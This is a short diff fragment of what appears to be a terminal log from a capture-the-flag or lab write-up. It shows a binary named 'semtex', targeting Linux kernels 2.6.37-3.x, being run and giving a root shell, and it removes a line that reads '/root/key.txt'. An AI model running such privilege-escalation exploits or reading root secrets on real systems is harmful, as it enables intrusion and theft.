@@ -9,4 +9,4 @@ bash-4.1$ ./semtex
 ./semtex  
 2.6.37-3.x x86_64  
 sd@fucksheep.org 2010  
--sh-4.1# cat /root/key.txt  
+-sh-4.1#  
